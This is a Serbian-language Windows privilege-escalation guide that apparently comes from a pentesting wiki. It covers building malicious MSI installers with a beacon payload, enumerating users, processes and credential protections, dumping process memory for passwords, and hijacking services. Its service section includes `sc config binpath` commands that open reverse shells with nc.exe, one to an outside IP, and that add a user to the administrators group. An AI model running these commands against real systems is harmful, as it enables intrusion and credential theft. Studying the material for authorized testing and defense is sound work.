### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da obmotate „**.bat**“ fajl ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi Windows EXE TCP payload u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer“ u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, kao lokaciju izaberite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne stignete do trećeg od četiri koraka (izbor fajlova koje želite da uključite). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim pokrenete instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### MSI instalacija

Da biste u pozadini izvršili **instalaciju** zlonamernog `.msi` fajla:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete upotrebiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Postavke revizije

Ove postavke određuju šta se **beleži**, pa treba da obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administratora**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su putem ACL-ova dodeljene odgovarajuće dozvole, što im omogućava da vide lozinke lokalnog administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA zaštita

Počevši od **Windowsa 8.1**, Microsoft je uveo unapređenu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njenu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA zaštiti ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o funkciji Credential Guard dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditivi domena** autentifikuju se pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavu korisnika autentifikuju pomoću registrovanog bezbednosnog paketa, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Nabrajanje korisnika i grupa

Trebalo bi da proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na sledećoj stranici saznajte više o **zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije

```bash
qwinsta
klist sessions
```

### Kućne fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzimanje sadržaja međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Procesi koji se izvršavaju

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete **da prepišete neku binarnu datoteku koja se izvršava** ili imate dozvole za pisanje u fasciklu binarne datoteke, kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers** koje biste mogli da zloupotrebite za eskalaciju privilegija](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener može biti kratkotrajan, pa njegovo odsustvo u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne dokazuju izvršavanje koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor direktorijumi

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, pregledajte baš tu konfiguraciju i ACL direktorijuma koji je u njoj naveden. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućnosti code execution-a pri sledećem učitavanju modula od strane zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; samo mogućnost upisivanja u direktorijum ne potvrđuje eskalaciju. [Dokumentacija za Snort-ov dynamic preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom rada.

### Privilegovani web servis sa upisivim korenom dokumenata

Na Windows instalaciji Apache-a uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u aktivnom `httpd.conf`. Za uobičajeni XAMPP raspored, pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, koji je često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, code execution na strani servera može da pređe granicu privilegija hosta. Potvrdite da je servis pokrenut, да се приказује тачна путања и да handler на страни сервера обрађује тип датотеке; сам уписиви корен доказује само могућност креирања датотека. Прегледајте ACL-ове без уписивања пробне датотеке:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za standardnu WAMP instalaciju, servis može upućivati na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), a konfiguracija se nalazi pored njega, u `conf\httpd.conf`, uz podrazumevani korenski direktorijum `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene za virtual host) i ACL korenskog direktorijuma. To što je WAMP direktorijum moguće menjati ne dokazuje da se Apache pokreće kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS korenski direktorijum sa dozvolom upisa i mrežni identitet skupa aplikacija

Za IIS, povežite fizički direktorijum u koji je moguće upisivati sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji su skup aplikacija i handler na serveru podešeni za njega. Kod smešten u direktorijumu koji se opslužuje izvršava se kao skup aplikacija samo ako IIS obrađuje taj tip datoteke i ruta je dostupna. Pre nego što direktorijum u koji je moguće upisivati smatrate putem do izvršavanja koda, proverite efektivni pristup trenutnog korisnika za kreiranje datoteka, stanje sajta, handler i izmene koje važe za konkretnu putanju.

Dinamička kompilacija ASP.NET-a uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano se one nalaze u direktorijumu `Temporary ASP.NET Files` u okviru odgovarajuće instalacije .NET Framework-а, ali `<compilation tempDirectory>` u aplikaciji može promeniti tu lokaciju. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompilaciju kada skupovi aplikacija nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompilacije, identitetom procesa i vremenom eventualne ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompilaciju niti menjati datoteke keša tokom enumeracije.

Skup IIS aplikacija podešen na `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje prema resursima domena kao **nalog računara domaćina**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke privilegije lokalno i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Skup `SpecificUser` koristi nalog koji je za njega podešen. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet skupa aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu se primeniti podrazumevane vrednosti skupa, koje se razlikuju među verzijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena skupa. Ako se izvršavanje koda odvija u skupu koji na mreži koristi identitet računara, procenite prava direktorijuma za **taj konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava za replikaciju nad kontekstom imenovanja domena; tiket naloga računara ili uloga domaćina sami po sebi ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod čitljivog ASP.NET handler-a koji pokreće pomoćni proces, pratite svaku vrednost poteklu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Handler koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti da metaznakovi shell-a izmene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi handler-u, a zatim utvrdite efektivni identitet skupa aplikacija ili identitet koji se preuzima i identitet pod kojim se pokreće podređeni proces. Čitljiva linija izvornog koda, listener na localhost-u ili slabost u formatu tokena sami po sebi ne dokazuju izvršavanje privilegovane komande. Pregledajte izvorni kod i konfiguraciju skupa bez slanja falsifikovanih zahteva ili pokretanja pomoćnog programa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom, prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php), može da izvrši PHP datoteku u koju korisnik sa nižim privilegijama može da upisuje, pod identitetom radnog procesa. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja pokazuje na datoteku koju korisnik sa nižim privilegijama može da izmeni, a radni proces da pročita, da važeća PHP ograničenja putanja dozvoljavaju uključivanje i da se radni proces zaista pokreće sa višim privilegijama. Listener na loopback adresi ili datoteka u koju je moguće upisivati sami po sebi ne dokazuju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja endpoint-a.

### Pronalaženje lozinki u memoriji

Možete napraviti dump memorije pokrenutog procesa pomoću alata **procdump** iz sysinternals. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support” (Windows + F1), potražite „command prompt”, kliknite na „Click to open Command Prompt”

### Uvoz projektnih datoteka sa višim privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za odlaganje u koji može da piše korisnik sa nižim privilegijama prelazi granicu poverenja u ulaznim podacima pod nalogom aplikacije za uvoz. Proverite **tačnu putanju u koju može da se piše**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je spoljnim XML entitetima da budu navedeni u metapodacima projekta; mrežni entitet u operativnom sistemu Windows mogao je da izazove autentifikaciju nalogom aplikacije za uvoz ako [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) to dozvoljavaju. Ovo ukazuje na moguću izloženost akreditiva, a ne na neposredan pristup administratora: dobijeni odgovor mora biti upotrebljiv kroz zasebnu autorizovanu ili ranjivu putanju, a aktuelne verzije treba proceniti na osnovu stvarnog stanja zakrpa. Ne otvarajte pripremljeni projekat tokom pasivne enumeracije; proverite tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager-a (SCM) odvojeno je od prava nad postojećim servisom. Uspešan zahtev za pristup samo za čitanje [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo ukazuje na nešto što treba proveriti, ali nije dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom servisu zatraženim prilikom kreiranja; kasnije ponovno otvaranje servisa podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada bi prvobitni handle mogao da se iskoristi. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog servisa, pravila pokretanja i putanju izvršne datoteke. Ne kreirajte niti pokrećite servis tokom pasivne enumeracije.

Za udaljenu putanju instalacije servisa, uporedite ta SCM prava sa deljenim resursom na ciljnom sistemu u koji može da piše **isti mrežni nalog za prijavljivanje**, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za smeštanje datoteke; administratorski deljeni resurs nije neophodan uslov. Samo pravo upisivanja u deljeni resurs ili samo indikacija da postoji pravo kreiranja SCM servisa ne dokazuje da novi servis može da se pokrene pod identitetom sa višim privilegijama.

Postojeći servis može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada ta datoteka ne postoji u njegovom `ImagePath`-u. Ako se ime pomoćne datoteke razrešava u direktorijum u koji može da piše korisnik sa nižim privilegijama, a servis se pokreće pod identitetom sa višim privilegijama, nedostajuća datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i dostupan okidač životnog ciklusa. Direktorijum servisa u koji može da se piše ili sama činjenica da datoteka nedostaje ne dokazuju da servis učitava tu datoteku; tokom pasivne provere nemojte pokretati niti zaustavljati servis.

Za postojeći servis, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od prava [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod servisa ili dokumentovani interfejs pre nego što pravo pokretanja smatrate nečim više od prava upravljanja. Ako servis koristi argument koji je odabrao pozivalac kao putanju za zapisnik ili izvoz, proverite identitet servisa, tačan tok argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; zapisnik u koji može da se piše ili samo pravo pokretanja nisu dovoljni. Pasivna inventarizacija ne bi smela da pokreće servis niti da kreira testnu datoteku.

Kod agenta za nadzor NSClient++, čitljiva datoteka `nsclient.ini` ukazuje na **konfiguraciju koju treba proveriti**: u njoj mogu da se nalaze akreditivi za web, dok `boot.ini` može da preusmeri konfiguraciju na drugo mesto. Proverite stvarni nalog servisa, WEB slušaoca i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za izvršavanje sa višim privilegijama dodatno su neophodni `CheckExternalScripts` (ili druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Slušalac ograničen na loopback i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili slušalac ne dokazuju da ta prava postoje. Tokom pasivne enumeracije pregledajte metapodatke i dozvole, nemojte prikazivati tajne niti pozivati web API. Погледајте [raspored datoteka NSClient++-a](https://nsclient.org/docs/concepts/file-layout/), [smernice za bezbednost web-a i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju spoljašnjih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za servis čiji je `ImagePath` `nssm.exe`, proverite stvarni nalog pod kojim se servis pokreće i vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov podešeni radni direktorijum. Proverite podređenu izvršnu datoteku и ACL-ove njenih nadređenih direktorijuma pre nego što prava omotača smatrate celom servisnom granicom. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija predstavlja zasebnu indikaciju za proveru: potvrdite da je slušalac dostupan korisniku sa nižim privilegijama, da tačna operacija prihvata njegov ulaz i da podređeni servis izvršava nebezbednu operaciju pod identitetom sa višim privilegijama. Nalog servisa, URL krajnje tačke ili putanja u koju može da se piše sami po sebi ne dokazuju eskalaciju; tokom pasivne enumeracije ne pozivajte operacije servisa.

Za prilagođenu WCF operaciju pratite string kojim upravlja pozivalac sve do bilo kog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows akредитивима transporta](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali ovlašćenje za pozivanje te **konkretne** operacije i efektivni identitet runspace-a treba proveriti zasebno. Putanja od ulaza pozivaoca sa nižim privilegijama do `AddScript`-a pod identitetom servisnog naloga sa višim privilegijama predstavlja granicu za izvršavanje koda; port koji sluša, autentifikovani klijent ili neiskorišćena metoda u nepovezanom sklopu sami po sebi nisu dokaz. Statički pregledajte instalirani servis, ugovor, ovlašćivanje i podešavanja impersonacije, bez pozivanja krajnje tačke tokom enumeracije.

Service Triggers omogućavaju operativnom sistemu Windows da pokrene servis kada se ispune određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP adrese, priključivanje uređaja, osvežavanje GPO-a itd.). Čak i bez prava SERVICE_START često možete da pokrenete privilegovane servise aktiviranjem njihovih okidača. Tehnike enumeracije i aktiviranja pogledajte ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Servis za prikupljanje dijagnostike Visual Studio-a

Instalacije Visual Studio-a sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostički servis podešen da se pokreće kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i trku uslova sa object-manager-link-om da preusmeri resetovanje DACL-a servisa. Za prikazanu eskalaciju bio je potreban i upotrebljiv put za popravku MSI-ja preko Visual Studio Setup WMI Provider-a, kao i njegova ciljna datoteka `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu trijažu proverite nalog i binarnu putanju tog servisa, da li postoji putanja do Setup WMI kompajlera i status zakrpa instalirane komponente. Unos servisa, verzija proizvoda Visual Studio ili sama datoteka kompajlera ne dokazuju da je sistem ranjiv. Provera ne zahteva pokretanje servisa niti izvršavanje popravke.

Pribavite listu servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o usluzi.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ kako biste proverili potreban nivo privilegija za svaki servis.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li „Authenticated Users“ mogu da menjaju neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga se ne može pokrenuti zato što je onemogućena ili zato što uz nju nisu povezani omogućeni uređaji._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** za servis, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili servis i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovo pokreni servis

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava promenu konfiguracije binarne datoteke servisa.
- **WRITE_DAC**: Omogućava promenu dozvola, čime se stiče mogućnost promene konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i promenu dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da izmene EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da izmenite binarnu datoteku koju servis izvršava** ili da li imate **dozvolu za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje izvršava servis možete da pronađete pomoću **wmic** (ne u system32), a svoje dozvole da proverite pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju do izvršne datoteke pomoću komande `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću komande `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili ispravnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću komande `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima radnju za slučaj greške koja ga ponovo pokreće ili aplikacija koja ga koristi može indirektno da ga pokrene.

### Dozvole za izmenu registra servisa

Proverite da li možete da izmenite neki ključ registra servisa.\
Možete **proveriti** svoje **dozvole** nad **ključem registra** servisa na sledeći način:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
